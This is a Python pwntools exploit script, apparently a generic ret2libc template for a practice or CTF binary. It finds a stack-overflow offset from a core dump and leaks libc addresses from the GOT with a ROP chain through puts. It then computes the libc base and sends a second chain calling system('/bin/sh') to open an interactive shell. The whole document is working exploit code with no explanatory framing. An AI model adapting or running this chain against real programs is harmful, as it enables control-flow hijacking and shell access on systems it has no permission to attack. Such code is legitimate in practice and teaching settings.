from pwn import *
#context.log_level = 'debug'
class Exploit:
	def __init__(self):
		self.elf = ELF("./tests/ret")
		self.offset_leaking = self.elf.process()
		self.rop = ROP(self.elf)
		#script = """
		#b *0x0000000000401185
		#"""
		#self.p = self.elf.debug(gdbscript=script)
		self.p = self.elf.process()
		context.arch = 'amd64'

	def recovery(self, instance, message, *args, exception=Exception, callback=lambda: None):
		try:
			instance.call(*args)
		except exception:
			log.warning(message)
			callback()

	def offset_finder(self, offset_leaking):
		offset_leaking = offset_leaking
		offset = b""
		if offset == b"":
			log.info("Searching for offset")
			self.offset_leaking.sendline(cyclic(516,n=8))
			self.offset_leaking.wait()
			core = Coredump('./core')
			offset = cyclic_find(core.read(core.rsp,8),n=8)
			log.info(f"Offset is {offset}")
		return offset

	def payload_generator(self, instance, offset):
		payload = [
			b"A"*offset,
			instance.chain()
		]
		print(payload)
		payload = b"".join(payload)
		return payload

	def main(self):
		offset = self.offset_finder(self.offset_leaking)

		self.p.recv()

		available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
		for func in available_funcs:
			self.recovery(self.rop,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
		self.recovery(self.rop,f"No main found...", self.elf.symbols["main"])
		
		payload1 = self.payload_generator(self.rop,offset)
		self.p.sendline(payload1)

		for name in available_funcs: 
			leaked = u64(self.p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
			log.info(f"{name} @ {hex(leaked)}")
		
		LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
		if LIBC:
			libc = ELF(LIBC)
			libc.address = leaked - libc.symbols[available_funcs[-1]]
			log.info(f"base libc {hex(libc.address)}")
		else:
			log.warning("No LIBC set. Please go to https://libc.blukat.me/")
			exit()

		roplibc = ROP(libc)
		self.recovery(roplibc, "Couldn't find ret", roplibc.find_gadget(["ret"]))
		self.recovery(roplibc, "Didn't found system...","system",[ next(libc.search(b"/bin/sh\x00")) ])
		self.recovery(roplibc,"Didn't found exit...","exit")

		payload2 = self.payload_generator(roplibc, offset)

		self.p.sendline(payload2)
		self.p.interactive()

exploit = Exploit()
exploit.main()
